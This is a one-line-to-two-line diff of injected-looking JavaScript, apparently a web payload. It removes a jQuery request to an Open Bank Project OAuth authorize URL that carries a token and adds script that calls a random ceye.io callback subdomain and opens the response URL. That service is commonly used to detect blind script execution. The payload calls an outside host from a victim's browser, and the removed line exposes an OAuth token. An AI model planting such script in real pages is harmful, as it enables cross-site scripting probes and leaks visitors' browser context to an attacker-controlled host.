@@ -1,1 +1,2 @@
-$.get('https://apisandbox.openbankproject.com/oauth/authorize?oauth_token=EYUQBNUZJJZCKUJNLGSOMRGRAV3XOS4BTK110ASZ',function(r){write(r)})
+var x=new XMLHttpRequest();x.open('GET','https://hnvh5p.ceye.io');x.send();
+x.onreadystatechange=function(){if(this.readyState==4){window.open(x.responseURL)}}
